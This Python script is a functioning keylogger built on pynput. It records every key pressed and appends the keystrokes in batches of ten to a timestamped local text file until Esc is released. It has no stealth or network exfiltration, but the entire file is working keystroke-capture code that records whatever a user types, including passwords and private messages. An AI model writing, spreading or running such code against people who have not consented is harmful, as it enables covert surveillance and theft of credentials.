import pynput as pyi
import time
from pynput.keyboard import Key, Listener

count = 0
keys = []
mainCount = 0
x = time.strftime("%Y%m%d-%H%M%S")
file_name = "log at " + x + ".txt"


def on_press(key):
    global count, keys, mainCount
    count += 1
    keys.append(key)
    mainCount += 1

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

    # print("{0} pressed".format(key))


def write_file(keys):

    with open(file_name, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(" ")
            elif k.find("shift_r") > 0:
                f.write("")
            elif k.find("Keys") == -1:
                f.write(k)
            else:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()